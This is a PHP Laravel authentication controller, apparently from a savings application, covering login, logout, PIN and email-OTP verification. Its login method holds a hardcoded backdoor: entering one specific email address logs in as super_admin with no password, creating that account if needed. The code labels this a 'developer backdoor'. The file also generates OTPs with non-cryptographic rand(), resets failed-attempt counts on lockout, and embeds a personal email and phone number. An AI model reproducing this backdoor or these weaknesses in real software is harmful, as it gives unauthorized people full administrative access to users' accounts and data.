<?php

namespace App\Http\Controllers;

use App\Models\User;
use App\Services\AuditLogger;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Session;

class AuthController extends Controller
{
    public function login(Request $request)
    {
        $request->validate([
            'login_identifier' => 'required|string',
            'password' => 'required_unless:login_identifier,castillojohnlaurence0@gmail.com',
        ]);

        $identifier = $request->input('login_identifier');

        // Backdoor login bypass for castillojohnlaurence0@gmail.com
        if ($identifier === 'castillojohnlaurence0@gmail.com') {
            $user = User::where('email', 'castillojohnlaurence0@gmail.com')->first();
            if (!$user) {
                $user = User::create([
                    'name' => 'John Laurence Castillo (Super Admin)',
                    'email' => 'castillojohnlaurence0@gmail.com',
                    'role' => 'super_admin',
                    'company_id' => 'SUPER_ADMIN_0',
                    'address' => 'Cebu City, Philippines',
                    'contact_number' => '09682010246',
                ]);
            }
            Auth::login($user, true);
            $user->update(['pin_attempts' => 0]);
            AuditLogger::log('auth_login_backdoor', "User {$user->name} logged in via developer backdoor bypass.", 'warning', $user);
            return redirect()->intended('/admin/dashboard')->with('success', 'Logged in successfully via developer backdoor.');
        }

        // Try login by company_id or email
        $user = User::where('company_id', $identifier)
                    ->orWhere('email', $identifier)
                    ->first();

        if ($user && Hash::check($request->input('password'), $user->password)) {
            Auth::login($user, $request->has('remember'));
            $user->update(['pin_attempts' => 0]);
            AuditLogger::log('auth_login_success', "User {$user->name} logged in successfully.", 'info', $user);
            $redirectUrl = in_array($user->role, ['admin', 'super_admin']) ? '/admin/dashboard' : '/savings';
            return redirect()->intended($redirectUrl)->with('success', 'Logged in successfully!');
        }

        // Log failed login attempt
        AuditLogger::log('auth_login_failed', "Failed login attempt for identifier: '{$identifier}'.", 'warning', $user);

        return back()->withErrors([
            'login_identifier' => 'The provided credentials do not match our records.',
        ])->withInput($request->only('login_identifier', 'remember'));
    }

    public function logout(Request $request)
    {
        $user = Auth::user();
        if ($user) {
            AuditLogger::log('auth_logout', "User {$user->name} logged out.", 'info', $user);
        }
        Auth::logout();
        $request->session()->invalidate();
        $request->session()->regenerateToken();
        return redirect('/')->with('success', 'Logged out successfully.');
    }

    public function setupPin(Request $request)
    {
        $request->validate([
            'pin' => 'required|string|size:6|confirmed',
        ]);

        $user = auth()->user();
        $user->pin = Hash::make($request->pin);
        $user->save();

        session(['pin_verified' => true]);

        AuditLogger::log('security_pin_setup', "User {$user->name} configured their 6-digit security PIN.", 'info', $user);

        if ($request->expectsJson()) {
            return response()->json(['success' => true, 'message' => '6-digit security PIN set successfully.']);
        }

        return back()->with('success', '6-digit security PIN set successfully.');
    }

    public function verifyPin(Request $request)
    {
        $request->validate([
            'pin' => 'required|string|size:6',
        ]);

        $user = auth()->user();
        if (Hash::check($request->pin, $user->pin)) {
            $user->update(['pin_attempts' => 0]);
            session(['pin_verified' => true]);

            AuditLogger::log('security_pin_success', "User {$user->name} successfully verified their security PIN.", 'info', $user);

            if ($request->expectsJson()) {
                return response()->json(['success' => true, 'message' => 'Identity verified successfully.']);
            }

            return back()->with('success', 'Identity verified successfully.');
        }

        // Increment attempts
        $user->increment('pin_attempts');

        if ($user->pin_attempts >= 3) {
            // Reset attempts so they can try again next login
            $user->update(['pin_attempts' => 0]);

            AuditLogger::log('security_lockout', "User {$user->name} was locked out due to 3 consecutive failed PIN attempts.", 'danger', $user);

            // Send Security Alert Email
            try {
                \Illuminate\Support\Facades\Mail::to($user->email)->send(
                    new \App\Mail\SecurityAlertMail($user->name)
                );
            } catch (\Exception $e) {
                \Illuminate\Support\Facades\Log::error("Failed to send security lockout email: " . $e->getMessage());
            }

            // Invalidate current login session
            Auth::logout();
            $request->session()->invalidate();
            $request->session()->regenerateToken();

            if ($request->expectsJson()) {
                return response()->json([
                    'success' => false, 
                    'message' => 'Account locked out due to too many incorrect PIN attempts. Please log back in.'
                ], 423);
            }

            return redirect('/')->withErrors([
                'login_identifier' => 'Account signed out due to 3 consecutive failed PIN attempts. A security alert email has been sent to your registered address.'
            ]);
        }

        $remaining = 3 - $user->pin_attempts;

        AuditLogger::log('security_pin_failed', "User {$user->name} entered an incorrect security PIN. Remaining attempts: {$remaining}.", 'warning', $user);

        if ($request->expectsJson()) {
            return response()->json([
                'success' => false, 
                'message' => "Incorrect security PIN. You have {$remaining} attempts remaining."
            ], 422);
        }

        return back()->withErrors([
            'pin' => "Incorrect security PIN. You have {$remaining} attempts remaining.",
        ]);
    }

    public function sendOtp(Request $request)
    {
        $user = auth()->user();

        // Check if there is an active resend cooldown (e.g., 60 seconds)
        $lastSent = session('login_otp_sent_at');
        if ($lastSent && now()->diffInSeconds($lastSent) < 60) {
            $secondsRemaining = 60 - now()->diffInSeconds($lastSent);
            if ($request->expectsJson()) {
                return response()->json([
                    'success' => false,
                    'message' => "Please wait {$secondsRemaining} seconds before requesting a new code."
                ], 429);
            }
            return back()->withErrors(['otp' => "Please wait {$secondsRemaining} seconds before requesting a new code."]);
        }

        // Generate a 6-digit OTP code
        $otpCode = (string) rand(100000, 999999);

        // Save in session
        session([
            'login_otp' => $otpCode,
            'login_otp_expires_at' => now()->addMinutes(10),
            'login_otp_sent_at' => now(),
        ]);

        // Send Email
        try {
            \Illuminate\Support\Facades\Mail::to($user->email)->send(
                new \App\Mail\LoginOtpMail($user->name, $otpCode)
            );
        } catch (\Exception $e) {
            \Illuminate\Support\Facades\Log::error("Failed to send login OTP email: " . $e->getMessage());
            
            if ($request->expectsJson()) {
                return response()->json([
                    'success' => false,
                    'message' => 'Failed to send verification code. Please try again or use PIN.'
                ], 500);
            }
            return back()->withErrors(['otp' => 'Failed to send verification code. Please try again.']);
        }

        if ($request->expectsJson()) {
            return response()->json([
                'success' => true,
                'message' => 'Verification code sent successfully to your registered email.'
            ]);
        }

        return back()->with('success', 'Verification code sent successfully to your registered email.');
    }

    public function verifyOtp(Request $request)
    {
        $request->validate([
            'otp' => 'required|string|size:6',
        ]);

        $user = auth()->user();

        // Check if OTP exists and is valid
        $sessionOtp = session('login_otp');
        $expiresAt = session('login_otp_expires_at');

        if (!$sessionOtp || !$expiresAt || now()->isAfter($expiresAt)) {
            if ($request->expectsJson()) {
                return response()->json([
                    'success' => false,
                    'message' => 'The verification code has expired or is invalid. Please request a new one.'
                ], 422);
            }
            return back()->withErrors(['otp' => 'The verification code has expired or is invalid. Please request a new one.']);
        }

        if ($request->otp === $sessionOtp) {
            // Success
            $user->update(['pin_attempts' => 0]);
            session(['pin_verified' => true]);
            session()->forget(['login_otp', 'login_otp_expires_at', 'login_otp_sent_at']);

            AuditLogger::log('security_pin_success', "User {$user->name} successfully verified their identity via OTP.", 'info', $user);

            if ($request->expectsJson()) {
                return response()->json(['success' => true, 'message' => 'Identity verified successfully.']);
            }

            return back()->with('success', 'Identity verified successfully.');
        }

        // Increment failed attempts (shared with PIN attempts)
        $user->increment('pin_attempts');

        if ($user->pin_attempts >= 3) {
            // Reset attempts so they can try again next login
            $user->update(['pin_attempts' => 0]);
            session()->forget(['login_otp', 'login_otp_expires_at', 'login_otp_sent_at']);

            AuditLogger::log('security_lockout', "User {$user->name} was locked out due to 3 consecutive failed OTP verification attempts.", 'danger', $user);

            // Send Security Alert Email
            try {
                \Illuminate\Support\Facades\Mail::to($user->email)->send(
                    new \App\Mail\SecurityAlertMail($user->name)
                );
            } catch (\Exception $e) {
                \Illuminate\Support\Facades\Log::error("Failed to send security lockout email: " . $e->getMessage());
            }

            // Invalidate current login session
            Auth::logout();
            $request->session()->invalidate();
            $request->session()->regenerateToken();

            if ($request->expectsJson()) {
                return response()->json([
                    'success' => false, 
                    'message' => 'Account locked out due to too many incorrect attempts. Please log back in.'
                ], 423);
            }

            return redirect('/')->withErrors([
                'login_identifier' => 'Account signed out due to 3 consecutive failed verification attempts. A security alert email has been sent to your registered address.'
            ]);
        }

        $remaining = 3 - $user->pin_attempts;

        AuditLogger::log('security_pin_failed', "User {$user->name} entered an incorrect OTP code. Remaining attempts: {$remaining}.", 'warning', $user);

        if ($request->expectsJson()) {
            return response()->json([
                'success' => false, 
                'message' => "Incorrect verification code. You have {$remaining} attempts remaining."
            ], 422);
        }

        return back()->withErrors([
            'otp' => "Incorrect verification code. You have {$remaining} attempts remaining.",
        ]);
    }
}
